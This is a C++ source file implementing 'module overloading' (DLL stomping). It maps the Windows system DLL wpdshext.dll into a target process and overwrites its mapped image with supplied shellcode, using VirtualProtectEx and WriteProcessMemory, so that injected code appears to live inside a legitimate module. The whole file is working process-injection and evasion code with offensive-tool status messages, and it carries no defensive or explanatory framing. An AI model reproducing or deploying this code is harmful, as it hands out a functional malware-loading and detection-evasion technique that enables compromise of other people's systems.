#include "overloading.hpp"
#include <iomanip> // for std::hex

PVOID GetStompedAddress(HANDLE targetProcess, char* shellcode, size_t shellcodeSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    auto fNtCreateSection = (myNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    auto fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    // 1. Create the Section from the DLL
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\wpdshext.dll", GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;

    HANDLE hSection = NULL;
    NTSTATUS status = fNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (status != 0) return nullptr;

    // 2. Map into Remote Process
    PVOID remoteBase = NULL;
    SIZE_T remoteViewSize = 0;

    // Map as Read/Execute initially
    status = fNtMapViewOfSection(hSection, targetProcess, &remoteBase, 0, 0, NULL, &remoteViewSize, 2, 0, PAGE_EXECUTE_READ);

    if (status != 0 && status != (NTSTATUS)0x40000003) {
        std::cerr << "[-] Mapping failed: 0x" << std::hex << status << "\n";
        CloseHandle(hSection);
        return nullptr;
    }

    std::cout << "[+] DLL mapped at: 0x" << remoteBase << "\n";

    // 3. FORCE permissions change (Fixes Error 998)
    DWORD oldProtect;
    if (!VirtualProtectEx(targetProcess, remoteBase, shellcodeSize, PAGE_READWRITE, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx (RW) failed: " << GetLastError() << "\n";
        return nullptr;
    }

    // 4. Write the bytes
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(targetProcess, remoteBase, shellcode, shellcodeSize, &bytesWritten)) {
        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << "\n";
        return nullptr;
    }

    // 5. Restore permissions to RX
    VirtualProtectEx(targetProcess, remoteBase, shellcodeSize, oldProtect, &oldProtect);

    std::cout << "[+] Successfully stomped " << bytesWritten << " bytes at base.\n";

    CloseHandle(hSection);
    return remoteBase;
}